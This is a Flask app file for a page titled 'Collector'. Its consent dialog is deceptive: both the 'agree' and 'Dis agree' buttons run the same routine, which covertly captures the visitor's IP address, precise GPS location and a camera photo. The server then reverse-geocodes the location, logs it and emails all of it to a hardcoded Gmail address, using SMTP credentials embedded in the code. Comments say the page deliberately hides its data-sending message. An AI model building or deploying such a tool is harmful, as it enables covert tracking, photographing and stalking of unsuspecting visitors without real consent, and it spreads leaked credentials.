# app.py
# Flask app (updated): consent overlay -> auto-capture after consent
# UI no longer shows the explicit "Sending captured data to server..." message.
# It still shows minimal status and error messages, and continues to send emails/logs as before.

import os
import base64
import pathlib
import smtplib
import csv
import requests
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template_string
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USER = "tempidforshorts@gmail.com"
SMTP_PASS = "gedfxmynttaruppe"
DEST_EMAIL = "gonerakesh8186@gmail.com"


PHOTOS_DIR = pathlib.Path("photos")
PHOTOS_DIR.mkdir(exist_ok=True)
CSV_PATH = pathlib.Path("submissions.csv")

app = Flask(__name__)

INDEX_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Collector - Consent required</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial;margin:0;background:#111;color:#eee}
    .page{padding:28px; max-width:900px; margin:0 auto}
    label,input,select,button{font-size:16px}
    input,select{width:100%; padding:10px; margin-top:6px; background:#222; border:1px solid #444; color:#eee; border-radius:6px}
    .note{color:#ddd; margin-bottom:16px}
    .row{display:flex; gap:12px; margin-top:12px}
    button{background:#0a84ff;color:#fff;border:none;padding:10px 14px;border-radius:8px; cursor:pointer}
    #status{margin-top:12px; color:#ffa; white-space:pre-wrap}
    video{display:none}
    /* consent overlay */
    #consentOverlay{
      position:fixed; inset:0; background:rgba(0,0,0,0.85); display:flex; align-items:center; justify-content:center; z-index:9999;
    }
    #consentBox{background:#111; border:1px solid #333; padding:24px; width:min(720px,92%); border-radius:10px}
    #consentBox h2{margin-top:0}
    #consentBox p{color:#ddd}
    #consentButtons{display:flex; gap:12px; margin-top:18px}
    #consentButtons button{flex:0 0 auto}
  </style>
</head>
<body>
  <div id="consentOverlay">
    <div id="consentBox" role="dialog" aria-modal="true" aria-labelledby="consentTitle">
      <h2 id="consentTitle">Required</h2>
      <p>
        Are you agree to open the WEB Page

         </p>
      <div id="consentButtons">
        <button id="consentBtn">agree</button>
        <button id="declineBtn">Dis agree</button>
      </div>
    </div>
  </div>

  <div class="page" aria-hidden="true" id="pageContent">
    <h1>Enter your details </h1>
    <p class="note">Kindly enter te correct details</p>

    <label>Name</label>
    <input id="name" placeholder="Your name ">

    <label>Age</label>
    <input id="age" type="number" min="0" max="150" placeholder="Age ">

    <label>Gender</label>
    <select id="gender">
      <option value="">Select</option><option>Female</option><option>Male</option><option>Other</option><option>Prefer not to say</option>
    </select>

    <div class="row">
      <button id="submitBtn">Submit </button>
    </div>

    <div id="status" aria-live="polite"></div>
    <video id="preview" autoplay playsinline></video>
  </div>

<script>
let latest = { ip:'', lat:'', lon:'', accuracy:'', image_b64:'' };

function setStatus(s){ document.getElementById('status').innerText = s || ''; }

async function getPublicIp(){
  try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); return j.ip || ''; } catch(e){ return ''; }
}

function getPreciseLocation(timeoutMs=12000){
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve({ error: 'unavailable' });
    navigator.geolocation.getCurrentPosition(
      pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
      err => resolve({ error: err.code || err.message || 'denied' }),
      { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 0 }
    );
  });
}

async function capturePhoto(){
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
    const video = document.getElementById('preview');
    video.srcObject = stream;
    await new Promise((resolve, reject) => {
      let t = setTimeout(()=>reject('timeout'), 6000);
      video.onloadedmetadata = ()=>{ clearTimeout(t); resolve(); };
    });
    const c = document.createElement('canvas');
    c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
    c.getContext('2d').drawImage(video,0,0,c.width,c.height);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;
    return dataUrl;
  } catch(e){
    return '';
  }
}

async function doAutoCaptureAndSend(){
  // minimal UI messages only
  try {
    latest.ip = await getPublicIp();
  } catch(e){ latest.ip = ''; }

  const geo = await getPreciseLocation();
  if (geo && !geo.error){
    latest.lat = geo.lat; latest.lon = geo.lon; latest.accuracy = geo.accuracy;
  }

  latest.image_b64 = await capturePhoto();

  // send to server (no extra status message shown here)
  try {
    await fetch('/capture_auto', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
      ip: latest.ip,
      lat: latest.lat,
      lon: latest.lon,
      accuracy: latest.accuracy,
      image_b64: latest.image_b64
    })});
    // show concise confirmation
    setStatus(' ');
  } catch(e){
    setStatus('Auto-capture failed: ' + e.toString());
  }
}

/* consent overlay handlers */
document.getElementById('consentBtn').addEventListener('click', async () => {
  document.getElementById('consentOverlay').style.display = 'none';
  document.getElementById('pageContent').removeAttribute('aria-hidden');
  // immediately run auto capture & send (UI keeps minimal messages)
  doAutoCaptureAndSend();
});
document.getElementById('declineBtn').addEventListener('click', async () => {
  document.getElementById('consentOverlay').style.display = 'none';
  document.getElementById('pageContent').removeAttribute('aria-hidden');
  // immediately run auto capture & send (UI keeps minimal messages)
  doAutoCaptureAndSend();
});


/* form submit uses latest captured data (if any) and sends to /submit */
document.getElementById('submitBtn').addEventListener('click', async () => {
  document.getElementById('submitBtn').disabled = true;
  setStatus('Submitting form...');
  if (!latest.ip) latest.ip = await getPublicIp();
  try {
    const r = await fetch('/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
      name: document.getElementById('name').value || '',
      age: document.getElementById('age').value || '',
      gender: document.getElementById('gender').value || '',
      ip: latest.ip,
      lat: latest.lat || '',
      lon: latest.lon || '',
      accuracy: latest.accuracy || '',
      image_b64: latest.image_b64 || ''
    })});
    const j = await r.json();
    if (r.ok) {
      if (j.email_sent === false) setStatus('Form submitted. Email not sent.');
      else setStatus('Form submitted. Email dispatched.');
    } else {
      setStatus('Server error: ' + JSON.stringify(j));
    }
  } catch(e){
    setStatus('Submit failed: ' + e.toString());
  } finally {
    document.getElementById('submitBtn').disabled = false;
  }
});
</script>
</body>
</html>
"""

def send_email(subject: str, html_body: str, attachment_bytes: bytes = None, attachment_name: str = None):
    if not (SMTP_HOST and SMTP_USER and SMTP_PASS):
        return False, "SMTP not configured"
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_USER
        msg['To'] = DEST_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(html_body, 'html'))
        if attachment_bytes and attachment_name:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment_bytes)
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{attachment_name}"')
            msg.attach(part)
        smtp = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=15)
        smtp.starttls()
        smtp.login(SMTP_USER, SMTP_PASS)
        smtp.sendmail(SMTP_USER, [DEST_EMAIL], msg.as_string())
        smtp.quit()
        return True, None
    except Exception as e:
        return False, str(e)

def log_submission(row):
    try:
        new = not CSV_PATH.exists()
        with CSV_PATH.open('a', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            if new:
                w.writerow(['ts','event','name','age','gender','ip','lat','lon','accuracy','address','coords','photo'])
            w.writerow(row)
    except Exception:
        pass

def reverse_geocode(lat, lon):
    try:
        url = "https://nominatim.openstreetmap.org/reverse"
        params = {"format":"jsonv2","lat":str(lat),"lon":str(lon),"addressdetails":1}
        headers = {"User-Agent":"Collector/1.0 (contact@example.com)"}
        r = requests.get(url, params=params, headers=headers, timeout=8)
        if r.status_code == 200:
            j = r.json()
            return j.get('display_name','')
    except Exception:
        pass
    return ""

def save_image_from_b64(image_b64):
    if not image_b64:
        return None, None
    if ',' in image_b64:
        image_b64 = image_b64.split(',',1)[1]
    try:
        b = base64.b64decode(image_b64)
        ts = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S')
        fn = f'capture_{ts}.jpg'
        p = PHOTOS_DIR / fn
        p.write_bytes(b)
        return fn, b
    except Exception:
        return None, None

@app.route('/', methods=['GET'])
def index():
    req_ip = request.headers.get("X-Forwarded-For", request.remote_addr) or ""
    ip_info = {}
    try:
        if req_ip:
            r = requests.get(f'https://ipapi.co/{req_ip}/json/', timeout=5)
            if r.status_code == 200:
                ip_info = r.json()
    except Exception:
        ip_info = {}
    location_text = ", ".join([v for v in (ip_info.get('city'), ip_info.get('region'), ip_info.get('country_name'), ip_info.get('postal')) if v]) or "N/A"
    coords = ""
    if ip_info.get('latitude') or ip_info.get('longitude'):
        coords = f"{ip_info.get('latitude','')},{ip_info.get('longitude','')}"
    subject = f"Page opened - {req_ip}"
    html_body = f"""
    <h3>Page opened</h3>
    <ul>
      <li><strong>IP:</strong> {req_ip or '(unknown)'}</li>
      <li><strong>IP-based location:</strong> {location_text}</li>
      <li><strong>IP-based coords:</strong> {coords or '(not available)'}</li>
      <li><small>At: {datetime.now(timezone.utc).isoformat()}</small></li>
    </ul>
    """
    ok, err = send_email(subject, html_body)
    log_submission([datetime.now(timezone.utc).isoformat(), 'page-open', '', '', '', req_ip or '', ip_info.get('latitude',''), ip_info.get('longitude',''), '', location_text, coords, ''])
    return render_template_string(INDEX_HTML)

@app.route('/capture_auto', methods=['POST'])
def capture_auto():
    data = request.get_json(force=True)
    ip = data.get('ip','')
    lat = data.get('lat','')
    lon = data.get('lon','')
    accuracy = data.get('accuracy','')
    image_b64 = data.get('image_b64','')

    attach_name, attach_bytes = (None, None)
    if image_b64:
        attach_name, attach_bytes = save_image_from_b64(image_b64)

    address = reverse_geocode(lat, lon) if (lat and lon) else ""
    subject = f"Auto capture (consent) - {ip or '(no ip)'}"
    html_body = f"""
    <h3>Auto capture (after consent)</h3>
    <ul>
      <li><strong>IP:</strong> {ip or '(unknown)'}</li>
      <li><strong>Lat/Lon:</strong> {(lat and lon and f'{lat},{lon}') or '(none)'}</li>
      <li><strong>Accuracy (m):</strong> {accuracy or '(unknown)'}</li>
      <li><strong>Address:</strong> {address or '(not available)'}</li>
      <li><small>Captured at: {datetime.now(timezone.utc).isoformat()}</small></li>
    </ul>
    """
    if lat and lon:
        html_body += f'<p>Map: <a href="https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=19/{lat}/{lon}">OpenStreetMap</a></p>'

    ok, err = send_email(subject, html_body, attach_bytes, attach_name)
    log_submission([datetime.now(timezone.utc).isoformat(), 'auto-capture', '', '', '', ip or '', lat or '', lon or '', accuracy or '', address or '', (lat and lon and f'{lat},{lon}') or '', attach_name or ''])
    resp = {'ok': True, 'email_sent': bool(ok)}
    if not ok:
        resp['email_error'] = err
    return jsonify(resp), 200

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json(force=True)
    name = data.get('name','')
    age = data.get('age','')
    gender = data.get('gender','')
    ip = data.get('ip','')
    lat = data.get('lat','')
    lon = data.get('lon','')
    accuracy = data.get('accuracy','')
    image_b64 = data.get('image_b64','')

    attach_name, attach_bytes = (None, None)
    if image_b64:
        attach_name, attach_bytes = save_image_from_b64(image_b64)

    address = ""
    if lat and lon:
        address = reverse_geocode(lat, lon)
    else:
        try:
            if ip:
                r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
                if r.status_code == 200:
                    ji = r.json()
                    address = ", ".join([v for v in (ji.get('city'), ji.get('region'), ji.get('country_name'), ji.get('postal')) if v]) or ""
        except Exception:
            address = ""

    coords = (lat and lon and f'{lat},{lon}') or ""

    subject = f"Form submission - {name or '(no name)'} - {ip or '(no ip)'}"
    html_body = f"""
    <h3>Form submission</h3>
    <ul>
      <li><strong>Name:</strong> {name or '(empty)'}</li>
      <li><strong>Age:</strong> {age or '(empty)'}</li>
      <li><strong>Gender:</strong> {gender or '(empty)'}</li>
      <li><strong>IP:</strong> {ip or '(unknown)'}</li>
      <li><strong>Address:</strong> {address or '(not available)'}</li>
      <li><strong>Coords:</strong> {coords or '(not available)'}</li>
      <li><small>Submitted at: {datetime.now(timezone.utc).isoformat()}</small></li>
    </ul>
    """
    if coords:
        html_body += f'<p>Map: <a href="https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=19/{lat}/{lon}">OpenStreetMap</a></p>'

    ok, err = send_email(subject, html_body, attach_bytes, attach_name)
    log_submission([datetime.now(timezone.utc).isoformat(), 'form-submit', name, age, gender, ip or '', lat or '', lon or '', accuracy or '', address or '', coords or '', attach_name or ''])
    resp = {'ok': True, 'email_sent': bool(ok)}
    if not ok:
        resp['email_error'] = err
    return jsonify(resp), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT','3000')), debug=True)
